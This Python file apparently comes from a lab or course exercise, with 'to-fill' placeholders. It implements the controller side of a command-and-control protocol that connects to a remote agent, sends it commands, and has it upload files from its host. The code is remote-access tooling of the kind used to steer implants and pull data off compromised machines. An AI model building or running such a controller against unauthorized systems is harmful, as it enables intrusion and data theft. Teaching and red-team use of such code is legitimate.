import socket
import time
from protocol.common import *



class C2Protocol:
    def __init__(self, dst_ip, dst_port):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.dst_ip = dst_ip
        self.dst_port = dst_port

    def connect_to_agent(self):
        print(f"[+] Trying to connect to agent at {self.dst_ip}:{self.dst_port}")
        self.socket.connect((self.dst_ip, self.dst_port))
        print(f"[+] Connected to agent at {self.dst_ip}:{self.dst_port}")

    # todo: #to-fill
    def c2_hello_receive(self):
        message_type, status, agent_uuid = handle_init_handshake_receive(self.socket)
        if message_type != MESSAGE_REQUEST:
            raise TypeError(f"[-] C2 hello failed. agent sent request {message_type}")

        return agent_uuid

    def c2_hello_send(self, agent_uuid, status=MESSAGE_STATUS_OK):
        return handle_init_handshake_send(self.socket, agent_uuid, MESSAGE_RESPONSE, status)

    def send_command(self, command_id, arguments=""):
        print(f"[+] Sending to agent:\n\tcommand_id {command_id}\n\targuments: {arguments}")
        self.socket.sendall(
            (pack_command_id(command_id) +
             struct.pack(COMMAND_PAYLOAD_PACKET_FORMAT, MESSAGE_REQUEST, MESSAGE_STATUS_NONE, len(arguments)) +
             arguments.encode())
        )

    def send_file_upload_command(self, file_path_to_upload):
        print(f"[+] Sending to agent:\n\tcommand_id {FILE_UPLOAD_COMMAND_ID}\n\tFile to upload: {file_path_to_upload}")
        self.socket.sendall(
            (pack_command_id(FILE_UPLOAD_COMMAND_ID) +
             struct.pack(FILE_UPLOAD_PACKET_FORMAT, MESSAGE_REQUEST, MESSAGE_STATUS_NONE, len(file_path_to_upload), 0) + #   0 bytes for the   the file data size as this is the request
             file_path_to_upload.encode())
        )

    def receive_file_upload_command(self, file_path_size, file_data_size):
        if file_path_size == 0 or file_data_size == 0:
            raise ValueError(f"[-] File uploaded from agent is corrupted")

        file_path = self.socket.recv(file_path_size)
        file_data = receive_payload(self.socket, file_data_size)
        if not file_path or not file_data:
            raise ValueError(f"[-] File uploaded from agent is corrupted")

        # return a tuple
        return (file_path, file_data)


    def receive_command_response(self):
        print("[+] Waiting for response from agent...")
        time.sleep(2)
        command_id = receive_command_id(self.socket)
        print(f"[+] Receiving response for command {command_id} ...")
        if command_id == FILE_UPLOAD_COMMAND_ID:
            message_type, status, file_path_size, file_data_size = struct.unpack(FILE_UPLOAD_PACKET_FORMAT, self.socket.recv(10))
        else:
            message_type, status, payload_size = struct.unpack(COMMAND_PAYLOAD_PACKET_FORMAT, self.socket.recv(6))
        if message_type != MESSAGE_RESPONSE:
            raise TypeError(f"[-] Agent sent wrong {message_type} message.")

        if command_id == FILE_UPLOAD_COMMAND_ID: # file upload has special handling than the rest of commands
            return status, self.receive_file_upload_command(file_path_size, file_data_size)

        return status, receive_payload(self.socket, payload_size)

    # todo: #to-fill












